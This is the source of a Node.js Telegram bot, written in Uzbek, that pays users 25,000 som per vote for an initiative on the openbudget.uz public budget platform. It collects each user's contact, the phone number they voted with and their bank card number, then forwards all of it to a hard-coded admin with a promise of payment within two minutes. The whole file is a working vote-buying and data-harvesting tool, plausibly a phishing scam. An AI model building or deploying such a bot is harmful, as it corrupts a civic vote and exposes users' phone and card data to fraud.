require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

const TOKEN = process.env.TOKEN;
const bot = new TelegramBot(TOKEN, { polling: true });

const SUPER_ADMINS = [6452821026];
const usersWithContact = new Set();
const usersWaitingForNumber = new Map();
const userData = new Map();

let lastVideoFromAdmin = null;

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;

    if (usersWithContact.has(chatId)) {
        sendVotingOptions(chatId);
        return;
    }

    bot.sendMessage(chatId, "Assalomu alaykum! Siz bizning botimiz orqali ovoz berib, pul ishlashingiz mumkin. 1 ovoz = 25.000 so‘m. Ovoz berish va davom etish uchun iltimos, kontakt yuboring (Tugmani bosing):", {
        reply_markup: {
            keyboard: [
                [{ text: "📞 Kontakt yuborish", request_contact: true }]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

bot.on("contact", (msg) => {
    const chatId = msg.chat.id;
    const user = msg.from;
    const contact = msg.contact;

    if (usersWithContact.has(chatId)) return;

    usersWithContact.add(chatId);

    bot.sendMessage(chatId, "✅ Rahmat! Kontakt qabul qilindi.", {
        reply_markup: { remove_keyboard: true }
    });

    const serverTime = new Date();
    const userTime = new Date(serverTime.getTime() + 5 * 60 * 60 * 1000);

    const userInfo = `
🔥 Yangi foydalanuvchi:
🆔 ID: ${user.id}
👤 Ism: ${user.first_name || "Noma’lum"}
📛 Username: @${user.username || "Noma’lum"}
📞 Telefon raqami: ${contact.phone_number}
🕒 Bosilgan vaqt: ${userTime.toLocaleString()}
`;

    SUPER_ADMINS.forEach((adminId) => {
        bot.sendMessage(adminId, userInfo);
    });

    if (lastVideoFromAdmin) {
        bot.sendVideo(chatId, lastVideoFromAdmin.fileId, {
            caption: lastVideoFromAdmin.caption || ""
        }).then(() => {
            sendVotingOptions(chatId);
        });
    } else {
        sendVotingOptions(chatId);
    }
});

bot.on("video", (msg) => {
    const chatId = msg.chat.id;
    if (msg.from.id === 6452821026) { 
        lastVideoFromAdmin = {
            fileId: msg.video.file_id,
            caption: msg.caption || ""
        };
        console.log("6452821026 adminidan video saqlandi:", lastVideoFromAdmin);
    }
});

function sendVotingOptions(chatId) {
    bot.sendMessage(chatId, "✅ Rahmat! Endi quyidagi usullardan biri bilan ovoz bering:", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🟢 Telegram orqali ovoz berish", url: "https://t.me/ochiqbudjet_3_bot?start=050366529005" }],
                [{ text: "🔵 Vebsayt orqali ovoz berish", url: "https://openbudget.uz/boards/initiatives/initiative/50/d3086427-04b2-4f9b-a31b-22b9aed0444f" }],
                [{ text: "✅ Ovoz berdim", callback_data: "voted" }]
            ]
        }
    });
}

bot.on("callback_query", (query) => {
    const chatId = query.message.chat.id;

    if (usersWaitingForNumber.has(chatId)) {
        bot.answerCallbackQuery(query.id, { text: "Siz allaqachon jarayondasiz!", show_alert: true });
        return;
    }

    bot.sendMessage(chatId, "📌 Iltimos, ovoz bergan telefon raqamingizni kiriting: \n (Namuna: +998-90-000-00-00)");
    usersWaitingForNumber.set(chatId, "waiting_for_number");
    userData.set(chatId, {});

    bot.answerCallbackQuery(query.id);
});

bot.on("message", (msg) => {
    const chatId = msg.chat.id;
    const user = msg.from;
    const text = msg.text;

    if (!usersWaitingForNumber.has(chatId)) return;

    const step = usersWaitingForNumber.get(chatId);
    const userInfo = userData.get(chatId) || {};

    if (step === "waiting_for_number") {
        userInfo.phone = text;
        userData.set(chatId, userInfo);
        usersWaitingForNumber.set(chatId, "waiting_for_card");

        bot.sendMessage(chatId, "💳 Iltimos, karta raqamingizni kiriting: \n (Namuna: 8600-0000-0000-0000)");
    } else if (step === "waiting_for_card") {
        userInfo.card = text;
        userData.set(chatId, userInfo);
        usersWaitingForNumber.delete(chatId);

        bot.sendMessage(chatId, "✅ Rahmat! Iltimos, bizni kuting. Sizga 2 daqiqa ichida pul tushiriladi. Murojaat uchun: +998-93-300-01-42");

        const adminMessage = `
✅ Foydalanuvchi ovoz berdi:
🆔 ID: ${user.id}
👤 Ism: ${user.first_name || "Noma’lum"}
📛 Username: @${user.username || "Noma’lum"}
📱 Chat ID: ${chatId}
📞 Ovoz bergan raqami: ${userInfo.phone}
💳 Karta raqami: ${userInfo.card}
🕒 Bosilgan vaqt: ${new Date().toLocaleString()}
📢 Admin, iltimos, ushbu foydalanuvchi ma'lumotlarini tekshirib, unga javob qaytaring!
`;

        SUPER_ADMINS.forEach((adminId) => {
            bot.sendMessage(adminId, adminMessage);
        });
    }
});

bot.onText(/\/reply (\d+) (.+)/, (msg, match) => {
    const adminId = msg.from.id;
    if (!SUPER_ADMINS.includes(adminId)) {
        bot.sendMessage(adminId, "⛔ Sizda bu huquq yo‘q!");
        return;
    }

    const userId = Number(match[1]);
    const replyText = match[2];

    bot.sendMessage(userId, `📩 Admin javobi: ${replyText}`);
    bot.sendMessage(adminId, "✅ Xabar foydalanuvchiga yuborildi!");
});

console.log("🚀 Bot ishga tushdi...");
